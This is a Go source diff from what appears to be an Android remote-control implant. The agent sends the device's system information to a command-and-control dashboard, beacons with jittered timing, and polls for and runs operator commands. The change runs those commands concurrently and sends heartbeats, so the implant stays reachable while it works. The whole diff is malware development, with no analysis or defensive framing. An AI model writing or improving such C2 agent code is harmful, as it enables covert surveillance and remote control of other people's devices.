@@ -2013,7 +2013,7 @@ func runAgent() {
 	// Auto-send system info so the dashboard has data immediately
 	c2.SendSystemInfo("android_sysinfo", info)
 
-	// Main C2 loop
+	// Main C2 loop — commands run in goroutines so heartbeats are never blocked
 	beaconInterval := 5 * time.Second
 	for {
 		// Jitter: ±10%
@@ -2026,13 +2026,17 @@ func runAgent() {
 		// Poll commands
 		cmds := c2.PollCommands()
 		for _, cmd := range cmds {
-			c2.UpdateCommand(cmd.ID, "executing", "")
-			result, err := handleCommand(c2, jm, cmd)
-			status := "complete"
-			if err != nil {
-				status = "failed"
-			}
-			c2.UpdateCommand(cmd.ID, status, result)
+			go func(cmd Command) {
+				c2.UpdateCommand(cmd.ID, "executing", "")
+				// Update last_seen so dashboard knows we're alive during execution
+				c2.Heartbeat()
+				result, err := handleCommand(c2, jm, cmd)
+				status := "complete"
+				if err != nil {
+					status = "failed"
+				}
+				c2.UpdateCommand(cmd.ID, status, result)
+			}(cmd)
 		}
 	}
 }
